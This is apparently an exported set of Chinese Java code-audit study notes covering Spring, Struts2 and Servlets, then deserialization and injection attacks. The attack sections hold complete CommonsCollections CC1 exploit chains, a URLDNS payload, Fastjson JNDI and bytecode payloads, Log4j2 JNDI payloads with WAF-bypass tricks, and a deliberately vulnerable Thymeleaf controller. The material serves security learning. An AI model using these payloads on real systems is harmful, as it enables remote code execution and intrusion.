└─jsp └─index.jsp 配置视图 spring: mvc: view: prefix: /WEB-INF/jsp/ suffix: .jsp prefix需要加上/，路径的拼接为前缀+视图名称+后缀：/WEB-INF/jsp/index.jsp 控制类 @Controller @RequestMapping(\"web\") public class WebController { @RequestMapping(value = \"index\",method = RequestMethod.GET) public String index(){ return \"index\"; } } 通过@Controller注解将WebController类声明为Spring MVC的控制器。 使用@RequestMapping(\"web\")注解将web作为基本URL路径，表示该控制器处理以/web开头的请求。 在index方法上使用@RequestMapping(value = \"index\", method = RequestMethod.GET)注解来映射具体的请求路径，即处理以/web/index的GET请求。 方法返回一个字符串 \"index\"，表示要渲染名为index的视图。 运行结果 SpringCloud (了解即可) 参考文章 通过IDEA搭建springboot项目（maven方式）idea创建springboot +maven智Min的博客-CSDN博客 https://congzhou09.github.io/knowledge/Java-web-%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%9E%B6%E6%9E%84%E6%BC%94%E8%BF%9B%E5%8E%86%E5%8F%B2.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 16:00:56 "},"03.代码审计/JAVA/03.JavaWeb了解/Struts2.html":{"url":"03.代码审计/JAVA/03.JavaWeb了解/Struts2.html","title":"Struts 2","keywords":"","body":"SSH（Struts2 + Spring + Hibernate） Struts2 解析：客户端发送请求（HttpServletRequest）到服务器，服务器接收到请求就先进入web.xml配置文件看看有没有配置过滤器，发现有有Struts2的过滤器，然后找到struts.xml配置文件，struts.xml配置文件里定义一个action，然后就去找到action类，此类继承ActionSupport接口，并且实现了execute()方法，返回一个字符串“success”给struts.xml配置文件，struts.xml配置文件的action会默认调用action类的execute()方法，result接收到返回的字符串，result就会调用你指定的jsp页面将结果呈现，最后响应给客户端。 Spring Hibernate Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架。 WEB-INF/web.xml struts2 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter struts2 /* WEB-INF/classes/struts.xml /jsp/success.jsp /jsp/error.jsp 在action标签中定义了name和class。name属性对应的是用户URL请求中的action名，class属性是处理请求的实现类（注意：要包含完整路径）。 result标签定义逻辑视图和物理视图之间的映射，在我们的Action中，如果返回的字符串是\"success”则由对应的success.jsp页面进行处理；如果返回的字符串是\"error”则由error.jsp页面进行处理。 src/com.cy.action package com.cy.action; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport { private static final long serialVersionUID = 1L; private String userName; private String password; public String execute() { if (userName.equals(\"hellokitty\") && password.equals(\"123\")) { return SUCCESS; } else { return ERROR; } } public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } } Struts2直接使用Action来封装HTTP请求参数，因此Action类应该包含与请求相对应的属性，并为该属性提供对应的setter和getter方法。 为Action类里增加一个execute方法，因为Struts2框架默认会执行这个方法。这个方法本身并不做业务逻辑处理，而是调用其他业务逻辑组件完成这部分工作。 Action类返回一个标准的字符串，该字符串是一个逻辑视图名，该视图名对应实际的物理视图。 WebRoot/jsp/login.jsp \"> My JSP 'Login.jsp' starting page --> 用户名： 密&nbsp;&nbsp;&nbsp;&nbsp;码: 1）首先客户端浏览器发送一个请求（HttpServletRequest）。 2）接着程序会调用 StrutsPrepareAndExecuteFilter，然后询问 ActionMapper 这个请求是否需要调用某个 Action。 3）如果 ActionMapper 决定需要调用某个 Action，StrutsPrepareAndExecuteFilter 会把请求的处理交给 ActionProxy。 4）ActionProxy 通过配置管理器（Configuration Manager）从配置文件（struts.xml）中读取框架的配置信息，从而找到需要调用的 Action 类。 5）ActionProxy 会创建一个 ActionInvocation 的实例。 6）ActionInvocation 使用命名模式调用 Action，在调用 Action 前，会依次调用所有配置的拦截器（Intercepter1、Intercepter2……）。 7）一旦 Action 执行完，则返回结果字符串，ActionInvocation 就会负责查找结果字符串对应的 Result，然后执行这个 Result。通常情况下 Result 会调用一些模板（JSP 等）呈现页面。 8）产生的 Result 信息返回给 ActionInvocation，在此过程中拦截器会被再次执行（顺序与 Action 执行之前相反）。 9）最后产生一个 HttpServletResponse 的响应行为，通过 StrutsPrepareAndExecuteFilter 反馈给客户端。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 16:26:16 "},"03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html":{"url":"03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html","title":"Tomcat","keywords":"","body":"Servlet Tomcat JSP Tomcat: 是Servlet的容器,Servlet运行在Tomcat容器当中,Servlet容器有很多(tomcat,Jboss,jetty)等 JSP: 全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以结束。 Serlvet: 全称Java Servlet,是用Java编写的服务器端程序。Servlet只是一个Java类，就像控制器类一样，接收前端传过来的数据，然后进行处理。 定义一个 Servlet 很简单，只需要继承javax.servlet.http.HttpServlet类并重写doXXX(如doGet、doPost)方法或者service方法就可以了 基于Web.xml配置--Servlet 页面和类是毫无关联的，需要在web.xml里面创建Url与Servlet之间的映射关系，/login由FirstServlet来进行处理 简单实现用户登录判断 FirstServelt import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; public class FirstServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String name = request.getParameter(\"name\"); String password = request.getParameter(\"password\"); String html = null; if (\"admin\".equals(name) && \"123\".equals(password)) html = \"success\"; else html = \"fail\"; PrintWriter pw = response.getWriter(); pw.println(html); } } index.jsp $Title$ 账号: 密码: 请求的处理流程：前端访问action，然后在web.xml会根据同名的url-pattern去访问对应的servlet类，servlet类里面做完相应的处理后，再返回内容到页面上 基于注解--Servlet>=3.0 @WebServlet(name = \"FirstServlet\", urlPatterns = {\"/login\"}) import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"FirstServlet\", urlPatterns = {\"/login\"}) public class FirstServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String name = request.getParameter(\"name\"); String password = request.getParameter(\"password\"); String html = null; if (\"admin\".equals(name) && \"123\".equals(password)) html = \"success\"; else html = \"fail\"; PrintWriter pw = response.getWriter(); pw.println(html); } } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 16:00:26 "},"03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html":{"url":"03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html","title":"JAVA反序列化之CC1--LazyMap","keywords":"","body":"CC1--lazyMap chains ysoserial中cc1链使用的是LazyMap 前置知识java代理 https://y4er.com/posts/java-proxy/ 关键点 被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发 分析 危险方法是InvokerTransformer.transform()，之前使用的是 TransformedMap 下的 checkSetValue 方法来调用，这次用LazyMap 下的 get 方法调用 factory.transform get方法 谁调用了get方法 可以看到是sun.reflect.annotation.AnnotationInvocationHandler 中的invoke方法，结合动态代理可以知道invoke 方法在对象代理时会被触发。而实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 // 构建对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 创建LazyMap的handler实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Action.class, outerMap); // 创建LazyMap的动态代理实例 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 动态代理对象，执行任意方法，都会到invoke中去 代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹（我们需要的是AnnotationInvocationHandler这个类的对象） // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); 完整poc public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class}, new Object[]{\"getRuntime\",new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}),}; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // 构建对象 Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); // 创建LazyMap的handler实例 InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); // 创建LazyMap的动态代理实例 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); serialize(handler); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:12:29 "},"03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html":{"url":"03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html","title":"Java反序列化之CC1-TransFormed","keywords":"","body":"CC1-TransFormed chains 环境 java commons-collections commons-collections 3.1 复现 Demo 关键点 # 能够任意命令执行的点 InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类使用了反射，并且反射的参数可控，可以⽤来执⾏任意⽅法。 # 手动调用InvokerTransformer的transfrom方法来执行命令 Runtime runtime = Runtime.getRuntime(); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(runtime); Demo代码解释 构造回调链 Transformer[] transformers = new Transformer[]{ //直接返回当前环境的Runtime对象 new ConstantTransformer(Runtime.getRuntime()), //第⼀个参数是待执⾏的⽅法名（哪个类的方法名？前一个回调函数返回的结果即ConstantTransformer返回的对象） //第⼆个参数是这个函数的参数列表的参数类型 //第三个参数是传给这个函数的参数列表 new InvokerTransformer( \"exec\", new Class[]{String.class}, new Object[]{\"calc\"} ), }; //将内部的多个Transformer串在⼀起，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊ Transformer transformerChain = new ChainedTransformer(transformers); 修饰Map TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。 //修饰Map Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate( innerMap, null, transformerChain ); 触发回调最后执行Runtime对象的exec方法 //触发回调 outerMap.put(\"test\", \"xxxx\"); POC 通过上面的Demo我们可知链子的尾巴在InvokerTransformer的transfrom方法,往回找 查看 TranformedMap 的构造方法，因为是 protected 属性无法调用，寻找到一个静态方法调用了构造方法 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); //使用静态方法decorate来调用构造函数 TransformedMap.decorate(map, null, invokerTransformer); 找谁调用了checkSetValue MapEntry的setValue是用于遍历HashMap的。所以只需要遍历一个Map就可以触发这个setValue方法。 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); map.put(\"test\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer); for (Map.Entry entry: transformedMap.entrySet()) { // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform entry.setValue(runtime); } 继续找谁调用了setValue，这里刚好有一个在readObject里调用了setValue的 并且从该类的构造函数可以知道memberValues是可控的 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}); HashMap map = new HashMap<>(); map.put(\"test\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer); // for (Map.Entry entry: transformedMap.entrySet()) { // // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform // entry.setValue(runtime); // } //类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行 Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationdhlConstructor.setAccessible(true); Object o = annotationInvocationdhlConstructor.newInstance(Override.class, transformedMap); 现在有两个问题 Runtime 类不可以被序列化，没有继承 serializable 接口，反射获取并转换为Transformer写法 ```java //首先需要获得Runtime类的Class实例 Class clz = Class.forName(\"java.lang.Runtime\"); //获得Runtime类的getRuntime方法 Method getruntime = clz.getMethod(\"getRuntime\"); //调用该方法获得Runtime对象 Object runtime = getruntime.invoke(clz); //获得Runtime类的exec方法 Method exec = clz.getMethod(\"exec\",String.class); //调用exec方法执行命令 exec.invoke(runtime,\"calc\"); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); 2. if条件 > 这部分是注解的知识 ![image-20230923190120874](../images/image-20230923190120874.png) > 1. sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法,方法名为value > > ```java > Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap); > > 被 TransformedMap.decorate 修饰的Map中必须有一个键名为value的元素 map.put(\"value\",\"xxx\"); 类不可控 需要控制setvalue的参数为Runtime对象 new ConstantTransformer(Runtime.class) //输入啥对象返回啥对象 最终payload public class CommonCollections1POC { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); HashMap map = new HashMap<>(); map.put(\"value\",\"123\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); // 手动触发setvalue // for (Map.Entry entry: transformedMap.entrySet()) { // // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform // entry.setValue(runtime); // } //类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行 Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationdhlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationdhlConstructor.setAccessible(true); // Target 注解类型 Object o = annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 总结 我们构造恶意的AnnotationInvocationHandler类，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给目标JAVA WEB应用进行反序列化。在进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令。 不要找同名函数调用陷入循环 如果类没有注明类型，默认为 default，即只能在本包内使用，需要用反射调用执行 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:12:33 "},"03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html":{"url":"03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html","title":"Java反序列化之URLDNS","keywords":"","body":"IDEA IDEA中的debug断点调试技巧，学会真的香！ - 腾讯云开发者社区-腾讯云 (72条消息) IntelliJ IDEA创建Servlet最新方法 Idea版本2020.2.2以及IntelliJ IDEA创建Servlet 404问题（超详细）_idea创建servlet项目_Granger_g的博客-CSDN博客 ysoserial 调试 下载源码，等待maven导入依赖，再配置如下即可（java版本为java8） 反序列化 基础 ​ 在java中，如果要对一个对象进行序列化或者反序列化，那么这个对象的类必须要实现java.io.Serializable接口。 函数 序列化writeObject ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); 反序列化readObject ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); 创建一个对象时各代码块的执行顺序 static {} → {} → 构造函数 serialVersionUID 反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。 SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。 反序列化数据标志 AC ED 00 05 URLDNS链 分析的时候发现需要注释掉ysoserial重写的 ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 SilentURLStreamHandler 类。 分析过程 如何寻找可能具有反序列化漏洞的类？ 要有readObject方法，所以直奔HashMap的readObject方法 putVal(hash(key), key, value, false, false); 在ysoserial中打下断点 跟进put 跟进hash 跟进hashCode 跟进handler.hashCode 跟进getHostAddress 这里多了一步，可能是版本问题吧？ 这⾥ InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。 Gadget Chain HashMap.readObject() HashMap.hash() URL.hashCode()：Field hashCode=-1 URLStreamHandler->hashCode() URLStreamHandler->getHostAddress() URL->getHostAddress() InetAddress->getByName() 需要实例化三个类 HashMap URLStreamHandler 无参构造，直接new URL payload import java.io.*; import java.lang.reflect.Field; import java.net.*; import java.util.HashMap; public class URLDNSTestDemo implements Serializable { public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException { HashMap hm = new HashMap(); URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; String url = \"http://123.1020fd40.ipv6.1433.eu.org\"; URL u = new URL(null, url, handler); // 通过反射修改私有属性hashCode为-1 Class clazz = u.getClass(); Field field = clazz.getDeclaredField(\"hashCode\"); field.setAccessible(true); field.set(u, -1); hm.put(u, url); } } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:12:31 "},"03.代码审计/JAVA/04.反序列化/FastJson.html":{"url":"03.代码审计/JAVA/04.反序列化/FastJson.html","title":"Fastjson漏洞","keywords":"","body":"FastJson是什么 Fastjson是阿里巴巴公司开源的一款json解析器，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到JavaBean。 FastJson反序列化漏洞 原理 1.2.24：fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的setter/getter方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。 1.2.47：fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。 User类 public class User { private String name; private int id; public User(){ System.out.println(\"无参构造\"); } public User(String name, int id) { System.out.println(\"有参构造\"); this.name = name; this.id = id; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", id=\" + id + '}'; } public String getName() { System.out.print(\"getName\"); return name; } public void setName(String name) { System.out.println(\"setName\"); this.name = name; } public int getId() { System.out.println(\"getId\"); return id; } public void setId(int id) { System.out.println(\"setId\"); this.id = id; } } 序列化 JSON.toJSONString(class); User user = new User(\"lihua\",3); String json = JSON.toJSONString(user); System.out.println(json); 序列化时会自动调用Getter方法 User user = new User(\"lihua\",3); String json = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(json); 传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。 @type 指定类，其他为该类Getter方法返回的类属性 反序列化 JSON.parse(json) JSON.parseObject(json,class) 只有在指定是哪一个类的前提下 使用JSON.parse反序列化会调用此类的set方法 使用JSON.parseObject反序列化会调用此类的get和set方法 如何指定一个类 json中使用@type指定 String json = \"{\\\"@type\\\":\\\"User\\\",\\\"id\\\":3,\\\"name\\\":\\\"lihua\\\"}\"; parseObject中的第二个参数指定 JSON.parseObject(json2, User.class) Payload JdbcRowSetImpl链 本质是JNDI注入，jdk版本需要满足 8u161 {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} setDataSourceName方法把传进去的值赋给dataSource setautoCommit方法需要传入一个布尔类型的参数，跟进connect方法，lookup(getDataSourceName()) lookup函数链接我们写入的服务 加载我们的恶意类 TemplatesImpl链 加载java字节码并实例化，可以通过该链注入内存马 局限性 {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }} 版本 Fastjson在不同版本下的利用方式很不同，所以存在Fastjson漏洞时，首要判断Fastjson的版本。 1.2.24 { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"xxx://xxx/xx\", \"autoCommit\":true } } 1.2.25--1.2.47 { \"a\":{ \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"xxx://xxx/xxx\", \"autoCommit\":true } } 1.2.48--1.2.68 1.2.80 不出网利用 TemplatesImpl链注入内存马，TemplatesImpl链限制多，不容易遇到 Commons-io 写文件/webshell 低版本 限制：fastjson BECL攻击，命令执行/内存马 限制：Java 8u251以后，bcel类被删除 C3P0反序列化 命令执行结果写到静态目录下 推荐阅读 新姿势https://github.com/luelueking/CVE-2022-25845-In-Spring 第18篇：fastjson反序列化漏洞区分版本号的方法总结 (qq.com) safe6Sec/Fastjson: Fastjson姿势技巧集合 Fastjson不出网利用总结 - 先知社区 (aliyun.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 22:54:08 "},"03.代码审计/JAVA/04.反序列化/JNDI.html":{"url":"03.代码审计/JAVA/04.反序列化/JNDI.html","title":"JNDI注入","keywords":"","body":"什么是JNDI JNDI(Java Naming and Directory Interface)是Java提供的Java命名和目录接口。 Naming Service 命名服务：命名服务将名称和对象进行关联，提供通过名称找到对象的操作 Directory Service目录服务：目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。 通过调用JNDI的API可以定位资源和其他程序对象。 通过名称查找(lookup)对象 通过对象的属性搜索(search)对象 JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA，如 dns://domain ldap://ip/name rmi://ip/name 什么是RMI RMI全称是Remote Method Invocation（远程⽅法调⽤），目的是为了让两个隔离的java虚拟机，如虚拟机A能够调用到虚拟机B中的对象，而且这些虚拟机可以不存在于同一台主机上。 RMI其发送、接收的数据都是反序列化数据。 什么是LDAP LDAP，全称为 Lightweight Directory Access Protocol，即轻量级目录访问协议，主要用于资源查询。 漏洞形成原因 JNDI支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。 如果目标应用进行了JNDI查询（lookup），并且其查询的地址或名称可控的话，就会形成JNDI注入漏洞 JNDI注入 流程 攻击者构造恶意协议，传入服务端（目标应用） rmi://ip:port/name ldap://ip:port/name dns://{外带数据}.域名 服务端连接到攻击者指定的服务，查询得到一个恶意的JNDI Reference 服务端解析该恶意JNDI Reference 根据解析结果到指定服务器上下载Factory的字节码 加载字节码，攻击者的恶意代码被执行 RMI 低版本 服务端 RMI服务 Reference reference = new Reference(className,classFactor,classFactoryLocation) className：远程加载时所使用的类名 classFactor：加载的 class 中需要实例化类的名称 classFactoryLocation：提供classes数据的地址可以是 file/ftp/http 等协议 存放恶意字节码的WEB服务器 恶意字节码对应的java文件 先启动RMI服务和web服务器 再启动Server 高版本 com.sun.jndi.rmi.object.trustURLCodebase 默认为 false，所以会进入 if 语句，抛出异常。 绕过 原理 绕过抛出异常后进入javax.naming.spi.NamingManager 实现 Tomcat Server中的BeanFactory类，通过该类的getObjectInstance方法反射调用了javax.el.ELProcessor的eval方法，最终实现了EL表达式执行达到RCE的效果。 LDAP 低版本 同RMI，远程加载即可 高版本 当从LDAP Server传来的对象是序列化对象时，会调用readobject方法，存在反序列化漏洞。 版本影响 com.sun.jndi.rmi.object.trustURLCodebase 默认为 false 绕过方法 利用本地Class作为Reference Factory 利用LDAP返回序列化数据，触发本地Gadget Log4J2 原理 Log4j是java用来处理日志的第三方组件，提供了Lookups的机制： 会对日志中用 ${prefix:key}包裹起来的变量进行解析 当记录的信息为${jndi:xxx}时,log4j2就会发起JNDI Lookup查询,从而触发JNDI注入漏洞。 基本payload ?a=${jndi:ldap://xxxx/a} log4j2包含的变量 https://github.com/bfengj/CTF/blob/main/Web/java/Log4j2/Log4j2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AD%A6%E4%B9%A0.md waf绕过 假设过滤了字符abc a${:-b}c ${lower:b} a${::-b}c a${E:-a}c a${:-${:-b}}c a${xxxanycodexxxx:-b}c unicode编码绕过 插入空白字符绕过 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 22:54:18 "},"03.代码审计/JAVA/Java-Thymeleaf模板注入.html":{"url":"03.代码审计/JAVA/Java-Thymeleaf模板注入.html","title":"Thymeleaf 模板注入","keywords":"","body":"Thymeleaf 模板介绍 Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点： Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。 Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。 Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。 Thymeleaf 模板使用 依赖 org.springframework.boot spring-boot-starter-thymeleaf Controller @Controller public class welcomeController { ... @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted 